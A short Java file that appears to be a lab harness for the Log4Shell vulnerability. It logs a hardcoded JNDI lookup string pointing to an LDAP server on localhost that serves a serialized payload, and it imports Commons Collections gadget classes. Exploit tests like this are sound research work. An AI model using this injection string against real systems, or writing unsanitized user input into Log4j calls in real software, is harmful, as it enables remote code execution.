import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.Level;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

public class HelloLog {

    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        String userInput = "${jndi:ldap://127.0.0.1:1389/serial/CustomPayload}";

        // passing user input into the logger
        logger.info("Test: "+userInput);

        // %m{nolookups} has no effect for the following line
        // logger.printf(Level.INFO,"Test: %s", userInput);
    }
}
